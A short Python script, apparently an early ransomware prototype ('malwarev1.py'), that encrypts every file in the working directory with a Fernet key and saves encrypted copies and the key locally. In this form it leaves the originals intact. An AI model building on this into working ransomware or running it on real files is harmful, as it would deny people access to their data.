import os
from cryptography.fernet import Fernet

def encrypt_files(files, key):
    # Cria uma pasta de destino para salvar os arquivos criptografados
    os.makedirs("encrypted_files", exist_ok=True)
    
    # Criptografa cada arquivo e salva o conteúdo de volta no arquivo
    for file in files:
        with open(file, "rb") as file_to_encrypt:
            content = file_to_encrypt.read()
        
        encrypted_content = Fernet(key).encrypt(content)
        
        encrypted_file_path = os.path.join("encrypted_files", file)
        
        with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_content)

    print("All files have been encrypted.")
    print("Encrypted files are saved in the 'encrypted_files' directory.")

def main():
    # Lista de arquivos a serem criptografados
    files = [
        file for file in os.listdir()
        if os.path.isfile(file) and file not in ["malwarev1.py", "scrapySimples.py", "encryption_key.key", "decrypt.py"]
    ]
    
    print("Files to be encrypted:")
    for file in files:
        print(file)
    
    # Gera uma nova chave secreta
    key = Fernet.generate_key()
    
    # Salva a chave secreta em um arquivo
    key_file_path = "encryption_key.key"
    with open(key_file_path, "wb") as key_file:
        key_file.write(key)
    
    encrypt_files(files, key)

if __name__ == "__main__":
    main()